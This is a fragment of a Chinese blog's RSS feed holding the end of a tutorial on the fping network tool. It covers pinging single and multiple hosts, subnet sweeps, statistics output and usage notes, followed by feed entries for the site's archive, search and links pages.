&lt;/h2>&lt;h3 id="一基本用法">（一）基本用法
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>ping 单个主机&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">fping 192.168.1.100
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>发送 ICMP Echo 请求到 &lt;code>192.168.1.100&lt;/code>。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>ping 多个主机&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">fping 192.168.1.1 192.168.1.2 192.168.1.3
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>同时对多个主机发送 ICMP Echo 请求。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>ping 网段中的所有主机&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">fping -g 192.168.1.0/24
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>生成并扫描 &lt;code>192.168.1.0/24&lt;/code> 网段中的所有主机。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>仅显示存活的主机&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">fping -a 192.168.1.1 192.168.1.2 192.168.1.3
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>仅显示响应 ICMP Echo 请求的主机。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="二高级用法">（二）高级用法
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>显示统计信息&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">fping -s 192.168.1.1 192.168.1.2 192.168.1.3
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>发送 ICMP Echo 请求并显示统计信息，包括发送和接收的 ICMP Echo 请求数量。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>指定发送次数和间隔&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">fping -c &lt;span class="m">3&lt;/span> -i &lt;span class="m">100&lt;/span> 192.168.1.100
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>对 &lt;code>192.168.1.100&lt;/code> 发送 3 次 ICMP Echo 请求，每次请求间隔 100 毫秒。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>从文件中读取主机列表&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">fping -f hosts.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>从文件 &lt;code>hosts.txt&lt;/code> 中读取主机列表并进行 ICMP Echo 请求。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>显示存活的主机并统计&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">fping -a -s 192.168.1.0/24
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>扫描 &lt;code>192.168.1.0/24&lt;/code> 网段中的所有主机，仅显示存活的主机并显示统计信息。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="六注意事项">六、注意事项
&lt;/h2>&lt;ol>
&lt;li>&lt;strong>权限问题&lt;/strong>：&lt;code>fping&lt;/code> 需要管理员权限才能发送 ICMP 请求。&lt;/li>
&lt;li>&lt;strong>网络环境&lt;/strong>：某些网络环境可能限制 ICMP 请求，导致 &lt;code>fping&lt;/code> 无法正常工作。&lt;/li>
&lt;li>&lt;strong>输出格式&lt;/strong>：&lt;code>fping&lt;/code> 的输出格式较为简洁，适合批量检测主机存活性。&lt;/li>
&lt;/ol>
&lt;h2 id="七总结">七、总结
&lt;/h2>&lt;p>&lt;code>fping&lt;/code> 是一个功能强大的工具，特别适合用于批量检测主机的存活性。通过掌握基本语法和常用选项，可以快速定位网络中的存活主机。结合 &lt;code>-s&lt;/code> 参数，可以获取更详细的统计信息，帮助分析网络状态。&lt;/p></description></item><item><title>归档</title><link>https://souljian.cn/archives/</link><pubDate>Sun, 06 Mar 2022 00:00:00 +0000</pubDate><guid>https://souljian.cn/archives/</guid><description/></item><item><title>搜索</title><link>https://souljian.cn/search/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://souljian.cn/search/</guid><description/></item><item><title>友情链接</title><link>https://souljian.cn/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://souljian.cn/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/</guid><description>&lt;p>To use this feature, add &lt;code>links&lt;/code> section to frontmatter.&lt;/p>
&lt;p>This page&amp;rsquo;s frontmatter:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="line">&lt;span class="cl">&lt;span class="nt">links&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="nt">title&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">GitHub&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">description&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">GitHub is the world&amp;#39;s largest software development platform.&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">website&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">https://github.com&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">image&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="nt">title&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">TypeScript&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">description&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">TypeScript is a typed superset of JavaScript that compiles to plain JavaScript.&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">website&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">https://www.typescriptlang.org&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">image&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">ts-logo-128.jpg&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>image&lt;/code> field accepts both local and external images.&lt;/p></description></item></channel></rss>